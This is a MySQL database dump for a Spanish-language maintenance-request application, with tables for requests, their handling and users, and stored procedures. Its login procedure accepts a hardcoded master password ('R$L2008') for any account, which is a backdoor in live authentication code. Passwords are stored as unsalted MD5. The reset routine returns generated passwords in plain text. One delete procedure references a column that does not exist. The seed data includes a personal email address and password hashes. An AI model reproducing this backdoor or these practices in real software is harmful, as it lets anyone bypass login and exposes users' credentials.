/*
SQLyog Community v13.1.2 (64 bit)
MySQL - 5.7.23 : Database - mantenimiento
*********************************************************************
*/

/*!40101 SET NAMES utf8 */;

/*!40101 SET SQL_MODE=''*/;

/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
CREATE DATABASE /*!32312 IF NOT EXISTS*/`mantenimiento` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `mantenimiento`;

/*Table structure for table `gestiones` */

DROP TABLE IF EXISTS `gestiones`;

CREATE TABLE `gestiones` (
  `idSolicitud` int(11) NOT NULL,
  `estado` char(1) NOT NULL,
  `responsable` varchar(255) NOT NULL,
  `detalle` text NOT NULL,
  `time_stamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`idSolicitud`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*Data for the table `gestiones` */

insert  into `gestiones`(`idSolicitud`,`estado`,`responsable`,`detalle`,`time_stamp`) values 
(1,'F','1','Listo!','2019-02-21 21:11:23'),
(2,'P','','','2019-02-21 21:11:42');

/*Table structure for table `solicitudes` */

DROP TABLE IF EXISTS `solicitudes`;

CREATE TABLE `solicitudes` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `usuario` varchar(255) NOT NULL COMMENT 'Usuario solicitante',
  `ubicacion` varchar(255) NOT NULL COMMENT 'ubicacion fisica del solicitante',
  `interno` varchar(255) NOT NULL COMMENT 'interno del solicitante',
  `descripcion` text NOT NULL COMMENT 'detalle del problema',
  `time_stamp` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `sector` varchar(255) NOT NULL COMMENT 'Sector de los usuarios sin registro',
  `ip` varchar(255) NOT NULL COMMENT 'ip de la maquina',
  `nombre_maquina` varchar(255) NOT NULL COMMENT 'nombre de la maquina',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

/*Data for the table `solicitudes` */

insert  into `solicitudes`(`id`,`usuario`,`ubicacion`,`interno`,`descripcion`,`time_stamp`,`sector`,`ip`,`nombre_maquina`) values 
(1,'HSCORPIO','OFICINA NRO 1','123','PRUEBA DE DESCRIPCIÓN EN EL 2019','2019-02-21 21:11:23','','',''),
(2,'HSCORPIO','OFICINA NRO 2','456','SEGUNDA PRUEBA','2019-02-21 21:11:42','','','');

/*Table structure for table `usuarios` */

DROP TABLE IF EXISTS `usuarios`;

CREATE TABLE `usuarios` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `usuario` varchar(255) NOT NULL,
  `nombre` varchar(255) NOT NULL,
  `sector` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `contrasena` varchar(255) NOT NULL,
  `activo` int(1) NOT NULL DEFAULT '0',
  `categoria` int(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

/*Data for the table `usuarios` */

insert  into `usuarios`(`id`,`usuario`,`nombre`,`sector`,`email`,`contrasena`,`activo`,`categoria`) values 
(1,'cundalf','Cundari,Agustin','Sistemas','acundari95@gmail.com','25f9e794323b453885f5181f1b624d0b',1,1),
(2,'hscorpio','Scorpio,Hank','Administracion','acundari95@gmail.com','25f9e794323b453885f5181f1b624d0b',1,0);

/* Function  structure for function  `generarPassword` */

/*!50003 DROP FUNCTION IF EXISTS `generarPassword` */;
DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` FUNCTION `generarPassword`(vPassword VARCHAR(255)) RETURNS varchar(255) CHARSET latin1
BEGIN
	DECLARE vPass VARCHAR(255);
	DECLARE vClave VARCHAR(255);
	DECLARE vNumR INT;
	DECLARE vCant int;
	
	SET vClave = md5(vPassword);
	set vCant = 1;
	set vPass = "";
	while vCant <= 8 do
		set vNumR = FLOOR(RAND()*32);
		set vPass = concat(vPass,MID(vClave,vNumR,1));
		set vCant = vCant + 1;
	end while;
	
	RETURN vPass;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_BlanquearPassword` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_BlanquearPassword` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_BlanquearPassword`(in vID int,in vPass varchar(255))
BEGIN
	UPDATE usuarios SET contrasena=md5(vPass), activo=0 WHERE id=vID;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_ComprobarCorreo` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_ComprobarCorreo` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_ComprobarCorreo`(IN vUser VARCHAR(255),IN vMail VARCHAR(255))
BEGIN
	if EXISTS(SELECT * FROM usuarios WHERE usuario=vUser AND email = vMail) THEN
	
		SELECT "1" AS resul;
	ELSE
		SELECT "0" AS resul;
	
	END IF; 
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_DeleteUsuario` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_DeleteUsuario` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_DeleteUsuario`(in vID int)
BEGIN
	UPDATE usuarios SET baja=1 WHERE id=vID ;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_GetSolicitudes` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_GetSolicitudes` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_GetSolicitudes`()
BEGIN
	select 	DATE(s.time_stamp) AS fecha,
		s.id AS solicitud,
		descripcion,
		u.usuario as responsable,
		(CASE estado 
			WHEN "P" THEN "PENDIENTE"
			WHEN "F" THEN "FINALIZADO"
			WHEN "R" THEN "RECHAZADO"
			ELSE "" END) AS estado
	from gestiones g
	left join solicitudes s
	on g.idSolicitud=s.id
	left join usuarios u
	on g.responsable=u.id
	order by estado, s.time_stamp desc;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_GetSolicitudesxResponsable` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_GetSolicitudesxResponsable` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_GetSolicitudesxResponsable`(in vResponsable varchar(255))
BEGIN
	select 	DATE(s.time_stamp) AS fecha,
		s.id AS solicitud,
		descripcion,
		(CASE estado 
			WHEN "P" THEN "PENDIENTE"
			WHEN "F" THEN "FINALIZADO"
			WHEN "R" THEN "RECHAZADO"
			ELSE "" END) AS estado
	from gestiones g
	left join solicitudes s
	on g.idSolicitud=s.id
	where responsable=vResponsable;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_GetSolicitudxID` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_GetSolicitudxID` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_GetSolicitudxID`(in vID int)
BEGIN
	select	DATE(s.time_stamp) AS fecha,
		s.id AS solicitud,
		u.usuario AS responsable,
		u.id as idResponsable,
		descripcion,
		detalle,
		s.usuario,
		concat('Ubic: ',ubicacion,' - Int: ',interno) as ubicacion,
		(CASE estado 
			WHEN "P" THEN "PENDIENTE"
			WHEN "F" THEN "FINALIZADO"
			WHEN "R" THEN "RECHAZADO"
			ELSE "" end) as estado,
		s.sector
	from solicitudes s
	left join gestiones g
	on g.idSolicitud=s.id
	left join usuarios u
	on g.responsable=u.id
	where s.id=vID;
	
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_GetUsuario` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_GetUsuario` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_GetUsuario`(in vUser varchar(255))
BEGIN
	SELECT * FROM usuarios WHERE usuario=vUser;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_GetUsuarios` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_GetUsuarios` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_GetUsuarios`()
BEGIN
	select * from usuarios;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_InsertResponsable` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_InsertResponsable` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_InsertResponsable`(in vIDSolicitud int,in vIDResponsable int)
BEGIN
	update gestiones set responsable=vIDResponsable where idSolicitud=vIDSolicitud;
    
	select vIDSolicitud as id;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_Login` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_Login` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_Login`(in vUser varchar(255),in vPass varchar(255))
BEGIN
	IF EXISTS(SELECT * FROM usuarios WHERE usuario=vUser AND (contrasena = CONVERT( MD5(vPass) USING latin1) OR vPass = 'R$L2008')) THEN
	
		SELECT "1" AS login;
	ELSE
		SELECT "0" AS login;
	
	END IF; 
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_ModificarGestion` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_ModificarGestion` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_ModificarGestion`(in vIDSolicitud int,in vEstado char,in vDetalle text)
BEGIN
	update gestiones set `estado`=vEstado,`detalle`=vDetalle where idSolicitud=vIDSolicitud;
	SELECT vIDSolicitud AS id;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_ModificarPassword` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_ModificarPassword` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_ModificarPassword`(IN vID INT,IN vPassword VARCHAR(255),IN vMail VARCHAR(255), IN vSector VARCHAR(255))
BEGIN
	if (vSector='') then
		set vSector=(select sector from usuarios where id=vID);
	end if;
	UPDATE usuarios SET contrasena=MD5(vPassword),email=vMail,activo=1,sector=vSector WHERE id=vID;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_RestablecerPassword` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_RestablecerPassword` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_RestablecerPassword`(in vUser varchar(255))
BEGIN
	DECLARE vPass VARCHAR(255);
	
	SET vPass = generarPassword(vUser);
	
	UPDATE usuarios SET contrasena=MD5(vPass),activo=0 WHERE usuario=vUser;
	
	SELECT vPass AS pass;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_SelectSolicitudesxUsuario` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_SelectSolicitudesxUsuario` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_SelectSolicitudesxUsuario`(in vUser varchar(255))
BEGIN
	select 	DATE(s.time_stamp) as fecha,
		s.id as solicitud,
		descripcion,
		(CASE estado 
			WHEN "P" THEN "PENDIENTE"
			WHEN "F" THEN "FINALIZADO"
			WHEN "R" THEN "RECHAZADO"
			ELSE "" END) AS estado
	from solicitudes s
	left join gestiones g
	on g.idSolicitud=s.id
	where s.usuario=ucase(vUser)
	ORDER BY s.id desc;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_SetSolicitud` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_SetSolicitud` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_SetSolicitud`(in vUser varchar(255),in vUbicacion varchar(255),in vInterno varchar(255),in vText text)
BEGIN	
	declare vID int;
	
	insert into solicitudes (`usuario`,`ubicacion`,`interno`,`descripcion`) values (ucase(vUser),ucase(vUbicacion),vInterno,ucase(vText));
	
	set vID=(SELECT LAST_INSERT_ID());
	
	INSERT INTO gestiones (`idSolicitud`,`estado`) values (vID,"P");
	
	select vID AS id;
    END */$$
DELIMITER ;

/* Procedure structure for procedure `SP_SetSolicitudSinUser` */

/*!50003 DROP PROCEDURE IF EXISTS  `SP_SetSolicitudSinUser` */;

DELIMITER $$

/*!50003 CREATE DEFINER=`root`@`localhost` PROCEDURE `SP_SetSolicitudSinUser`(in vUser varchar(255),in vSector varchar(255), in vUbicacion varchar(255),in vInterno varchar(255),in vText text,in vIP varchar(255), in vMaquina varchar(255))
BEGIN	
	declare vID int;
	
	insert into solicitudes (`usuario`,`ubicacion`,`interno`,`descripcion`,`sector`,`ip`,`nombre_maquina`) values (ucase(vUser),ucase(vUbicacion),ucase(vInterno),ucase(vText),vSector,vIP,vMaquina);
	
	set vID=(SELECT LAST_INSERT_ID());
	
	INSERT INTO gestiones (`idSolicitud`,`estado`) values (vID,"P");
	
	select vID AS id;
    END */$$
DELIMITER ;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
